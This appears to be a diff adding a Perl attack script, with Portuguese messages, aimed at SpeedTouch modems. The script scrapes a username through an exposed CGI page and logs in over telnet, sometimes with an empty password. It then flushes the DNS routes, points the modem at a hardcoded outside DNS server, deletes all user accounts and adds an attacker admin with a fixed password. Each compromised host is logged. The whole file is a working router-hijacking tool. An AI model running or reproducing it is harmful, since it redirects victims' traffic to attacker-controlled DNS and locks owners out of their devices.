@@ -1,0 +1,68 @@
+#!/usr/bin/perl
+
+# argv0 ip user pass
+
+my $host=$ARGV[0];
+my $user=$ARGV[1];
+my $pass=$ARGV[2];
+my @resp;
+
+print "[*] Testando $host\n";
+
+if($user == "CHECKUSER") {
+	$output = `curl -s --retry 1 --max-time 10 --connect-timeout 3 'http://$host/cgi/b/users/ov/?ce=1&be=0&l0=2&l1=8' | grep 'acac__md.gif' | sed 's/^.*usrname=//' | sed 's/".*\$//' | sed "s/')//"`;
+	if($output) { $user=$output } else { print "USERNAME NOT FOUND\n"; exit 0; };
+}
+
+use Net::Telnet;
+
+$telnet = new Net::Telnet (Timeout=>5, Errmode=>sub {&gotError}, Prompt => '/>$/i' );
+$telnet->open($host); print "[*] Erro: $telnet->errmsg\n"; print "[*] conexao estabelecida!\n";
+
+$telnet->waitfor('/Username :/'); print "[*] enviando username\n";
+$telnet->print("$user");
+if($pass) {
+	$telnet->waitfor('/Password :/');
+	print "[*] username aceito, enviando password\n";
+	$telnet->print("$pass");
+	@resp=$telnet->waitfor('/=>$/i');
+	print "[*] password aceito, modificando modem\n\n";
+} else {
+	#$telnet->waitfor('/Password :/');
+	print "[*] username aceito, enviando password NULO\n";
+	$telnet->print("\n");
+	@resp=$telnet->waitfor('/=>$/i');
+	print "[*] password aceito, modificando modem\n\n";
+}
+
+$telnet->print(':dns server route flush');
+@resp=$telnet->waitfor('/=>$/i');
+print "[*] :dns server route flush\n";
+
+$telnet->print(':dns server route add dns=162.216.152.54 metric=10 intf=Internet');
+@resp=$telnet->waitfor('/=>$/i');
+print "[*] :dns server route add dns=162.216.152.54 metric=10 intf=Internet\n";
+
+$telnet->print(':dns server route add dns=8.8.4.4 metric=20 intf=Internet');
+@resp=$telnet->waitfor('/=>$/i');
+print "[*] :dns server route add dns=8.8.4.4 metric=20 intf=Internet\n";
+
+$telnet->print(':dns server host list');
+@resp=$telnet->waitfor('/=>$/i');
+print "[*] :dns server host list\n";
+
+$telnet->print(':user flush');
+@resp=$telnet->waitfor('/=>$/i');
+print "[*] :user flush\n";
+
+$telnet->print(':user add name=admin password=L7D#6#F7H#56 role=Administrator defremadmin=enabled deflocadmin=enabled defuser=enabled');
+@resp=$telnet->waitfor('/=>$/i');
+print "[*] :user add name=admin password=L7D#6#F7H#56 role=Administrator defremadmin=enabled deflocadmin=enabled defuser=enabled\n\n";
+
+print "[*] modem modificado com sucesso, encerrando conexao\n";
+open (LOG, '>>logs/modificados.log');
+print LOG "$host speedtouch via telnet...\n";
+close (LOG); 
+exit 0;
+
+sub gotError { print "[*] Não foi possível conectar\n"; exit 0; }
